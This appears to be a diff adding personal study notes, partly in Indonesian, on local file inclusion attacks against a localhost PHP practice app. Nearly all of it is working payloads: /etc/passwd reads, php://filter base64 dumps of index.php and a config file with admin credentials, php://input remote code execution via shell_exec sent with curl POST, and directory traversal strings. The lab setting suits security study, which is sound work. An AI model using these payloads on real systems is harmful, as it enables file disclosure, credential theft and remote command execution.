@@ -1,0 +1,32 @@
+http://localhost/web_security/LFI/index.php?page=/etc/passwd
+
+php wrapper
+https://www.php.net/manual/en/wrappers.php
+
+mendapatkan file dari web
+http://localhost/web_security/LFI/index.php?page=php://filter/convert.base64-encode/resource=index.php
+
+echo "PD9waHAgcmVxdWlyZV9vbmNlICJjb25maWcucGhwIjsgPz4KCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgPHRpdGxlPk15IFdlYnNpdGU8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keT4KICA8aDE+V2VsY29tZSB0byBNeSBXZWJzaXRlPC9oMT4KCiAgPGEgaHJlZj0iaW5kZXgucGhwIj5Ib21lPC9hPiB8CiAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9cGFnZTEucGhwIj5QYWdlIDE8L2E+IHwKICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1wYWdlMi5waHAiPlBhZ2UgMjwvYT4gfAogIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPXBhZ2UzLnBocCI+UGFnZSAzPC9hPgoKICA8aHIgLz4KCiAgPD9waHAKCiAgaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKSB7CiAgICBpbmNsdWRlICRfR0VUWydwYWdlJ107CiAgfSBlbHNlIHsKICAgIGVjaG8gIjxwPlRoaXMgaXMgdGhlIGZyb250IHBhZ2UuPC9wPiI7CiAgfQoKICA/PgoKPC9ib2R5PgoKPC9odG1sPg==" | base64 -d
+
+http://localhost/web_security/LFI/index.php?page=php://filter/convert.base64-encode/resource=config.php
+echo "PD9waHAKCmRlZmluZSgiQURNSU5fVVNFUiIsICJhZG1pbiIpOwpkZWZpbmUoIkFETUlOX1BBU1MiLCAic3VmZmljaWVudGx5X2xvbmdfcGFzc3dvcmQiKTsK" | base64 -d
+
+yang paling bahaya :
+php://input
+http://localhost/web_security/LFI/index.php?page=php://input
+<?php echo "hai"; ?>
+<pre>
+<?php echo shell_exec("ls -la"); ?>
+<?php echo shell_exec("uname -a"); ?>
+
+</pre>
+
+curl -X POST -d "<?php echo shell_exec('ls -la'); ?>" http://localhost/web_security/LFI/index.php?page=php://input
+curl -X POST -d "<?php echo shell_exec('uname -a'); ?>" http://localhost/web_security/LFI/index.php?page=php://input
+curl -X POST -d "<?php echo shell_exec('cat config.php'); ?>" http://localhost/web_security/LFI/index.php?page=php://input
+
+ketika ditambahkan .php 
+http://localhost/web_security/LFI/index.php?page=php://filter/convert.base64-encode/resource=config
+
+directori traversal
+http://localhost/web_security/LFI/index.php?page=../../../../../../../etc/passwd
